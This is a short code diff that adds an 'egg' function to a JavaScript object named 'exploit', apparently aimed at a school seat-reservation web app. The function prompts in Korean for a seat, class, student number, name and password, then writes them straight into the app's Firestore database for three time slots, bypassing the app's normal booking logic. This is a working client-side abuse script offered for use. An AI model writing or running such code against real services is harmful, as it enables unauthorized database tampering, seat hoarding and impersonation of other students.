@@ -185,6 +185,38 @@ const exploit = {
         }
     },
 
+    egg: function() {
+        db = firebase.firestore();
+        ymd = window.location.search.substring(6, 14);
+        time = window.location.search[20];
+        var zali = prompt('자리 번호를 입력하세요...');
+        var _class = prompt('반을 입력하세요...');
+        var num = prompt('번호를 입력하세요...');
+        var name = prompt('이름을 입력하세요...');
+        var password = prompt('비밀번호를 입력하세요...');
+        if(num.length == 1) {
+            num = '0' + num;
+            }
+        var stunum = _class + num;
+        var bool = confirm('자리 번호 : ' + zali + ', 학번 : ' + stunum + ', 비밀번호 : ' + password + ' 가 맞습니까?');
+        if(bool) {
+            arr = ['8', '1', '2'];
+            for(var i=0; i<=2; i++) {
+                var save = {
+                    [zali]: [_class, num, name, password],
+                    _MAP: {
+                        [stunum]: 1
+                    }
+                };
+                db.collection('product1').doc(ymd+'-'+arr[i]).update(save);
+    
+                setTimeout(() => {
+                    location.reload();
+                }, 500); 
+            }
+        }
+    },
+ 
     play: function() {
         db = firebase.firestore();
         ymd = window.location.search.substring(6, 14);
